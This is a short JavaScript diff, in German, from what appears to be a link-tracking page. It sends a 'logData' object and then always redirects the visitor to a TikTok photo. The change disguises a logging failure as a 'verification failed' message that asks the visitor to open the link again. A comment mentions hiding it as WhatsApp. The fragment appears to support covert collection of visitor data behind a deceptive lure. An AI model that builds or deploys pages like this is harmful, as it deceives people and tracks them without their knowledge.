@@ -29,7 +29,7 @@
           body: JSON.stringify(logData)
         });
       } catch (error) {
-        console.error('Logging fehlgeschlagen:', error);
+        console.error('Verifizierung fehlgeschlagen! Bitte den Link erneut oeffenen:', error);
       } finally {
         // Weiterleitung zur Zielseite, foldPSY 4 / hidding = WhatsApp
         window.location.href = 'https://www.tiktok.com/@yunus.woistdasgold/photo/7503282224238710038';
